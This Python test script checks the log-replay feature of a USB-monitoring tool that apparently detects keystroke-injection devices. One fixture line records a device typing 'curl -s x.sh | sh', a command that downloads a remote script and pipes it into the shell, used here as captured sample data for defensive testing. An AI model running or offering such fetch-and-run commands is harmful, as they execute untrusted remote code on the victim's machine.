#!/usr/bin/env python3
"""--replay reads back what --log wrote. Drives the real binary, no devices needed.

The journal and the viewer socket carry the same events on purpose, so a log is
replayable by anything that reads a viewer. That claim is only true if something
actually reads it, which is what this checks.
"""
import json, os, subprocess, sys, tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BIN = os.path.join(ROOT, "usbairlock")
G, R, N = "\033[32m", "\033[31m", "\033[0m"
_results = []


def check(name, got, want):
    ok = got == want
    _results.append(ok)
    print(f"  {G}PASS{N}  {name}" if ok else
          f"  {R}FAIL{N}  {name}\n        got={got!r}\n        want={want!r}")


def run(*args):
    r = subprocess.run([sys.executable, BIN] + list(args),
                       capture_output=True, text=True, cwd=ROOT)
    return r.returncode, r.stdout


def write_log(path, records):
    with open(path, "w") as f:
        for r in records:
            f.write(json.dumps(r) + "\n")


def main():
    print()
    tmp = tempfile.mkdtemp(prefix="usbairlock-replay-")
    log = os.path.join(tmp, "session.jsonl")

    write_log(log, [
        {"ev": "session", "t": 1755000000, "pid": 4242,
         "argv": "--paranoid --auto", "protections": ["withhold_interface", "unbind_hid"]},
        {"ev": "present", "t": 1755000001, "addr": "1-5", "id": "0bda:5538",
         "worst": "none", "authorized": "1", "drivers": "uvcvideo"},
        {"ev": "present", "t": 1755000001, "addr": "1-1", "id": "1a2c:2d23",
         "worst": "HIGH", "authorized": "0", "drivers": "none"},
        {"ev": "status", "t": 1755000002, "lines": ["derived, should not render"]},
        {"ev": "log", "t": 1755000003, "line": "11:29:16  TYPED   1a2c:2d23  curl -s x.sh | sh"},
    ])

    rc, out = run("--replay", log)
    check("a HIGH device in the record exits 2", rc, 2)
    check("the session header renders", "--paranoid --auto" in out, True)
    check("protections are named", "withhold_interface" in out, True)
    check("the baseline renders", "0bda:5538" in out and "1a2c:2d23" in out, True)
    check("the captured line renders", "curl -s x.sh | sh" in out, True)
    check("status events are skipped, they are derived state",
          "should not render" in out, False)
    check("the event count is reported", "5 event(s), 1 session(s)" in out, True)

    # porcelain replay is a passthrough, so a log pipes into the same tooling as live output
    rc, out = run("--replay", log, "--porcelain")
    kinds = [l.split("\t")[0] for l in out.strip().splitlines() if l.strip()]
    check("porcelain replays every event including status",
          kinds, ["session", "present", "present", "status", "log"])

    clean = os.path.join(tmp, "clean.jsonl")
    write_log(clean, [{"ev": "present", "addr": "1-5", "id": "0bda:5538", "worst": "none"}])
    rc, _ = run("--replay", clean)
    check("a record with nothing HIGH exits 0", rc, 0)

    # A killed monitor leaves a half-written last line. That is the normal case for a
    # forensic log, so it must not take the whole replay down with it.
    torn = os.path.join(tmp, "torn.jsonl")
    with open(torn, "w") as f:
        f.write(json.dumps({"ev": "log", "line": "complete"}) + "\n")
        f.write('{"ev": "log", "line": "trunc')
    rc, out = run("--replay", torn)
    check("a truncated final line is skipped, not fatal", rc, 0)
    check("and everything before it still renders", "complete" in out, True)

    rc, out = run("--replay", os.path.join(tmp, "does-not-exist.jsonl"))
    check("a missing file exits 1 and says so", (rc, "cannot read" in out), (1, True))

    empty = os.path.join(tmp, "empty.jsonl")
    open(empty, "w").close()
    rc, out = run("--replay", empty)
    check("an empty log is not an error", (rc, "0 event(s)" in out), (0, True))

    import shutil
    shutil.rmtree(tmp, ignore_errors=True)
    ok = sum(_results)
    print(f"\n  {ok} passed, {len(_results) - ok} failed\n")
    return 0 if ok == len(_results) else 1


if __name__ == "__main__":
    sys.exit(main())
